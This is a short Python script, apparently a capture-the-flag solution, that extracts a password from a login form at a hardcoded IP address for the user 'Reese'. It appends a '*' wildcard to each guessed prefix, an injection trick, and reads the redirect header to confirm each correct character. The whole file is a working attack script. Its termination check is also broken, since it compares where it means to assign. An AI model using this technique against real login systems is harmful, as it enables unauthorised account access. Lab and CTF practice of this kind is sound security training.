import requests

# Create a requests and send it
def create_requests(url: str, data: dict) -> str:
    r = requests.post(url = url, data = data, allow_redirects=False)
    return r.headers

def readFile(file_url: str) -> list:
    res = []
    with open(file_url, 'r') as reader:
        for line in reader.readlines():
            character = line.strip()
            res.append(character)

    return res

if __name__ == '__main__':
    BASE_URL = "http://138.68.185.195:30199/login"
    USERNAME = "Reese"

    characters = readFile('alphanum-case-extra.txt')
    hasResults = False
    password = "HTB"

    while hasResults == False:
        hasIterated = True
        for char in characters:
            fuzz = password + char
            data = {
                'username': USERNAME,
                'password': fuzz + "*"
            }
            response_headers = create_requests(BASE_URL, data)
            try:
                if response_headers['Location'] != "/login?message=Authentication%20failed":
                    password = fuzz
                    hasIterated = False
                    break
            except:
                print(char)
        
        if hasIterated == True:
            hasResults == True
        print(password)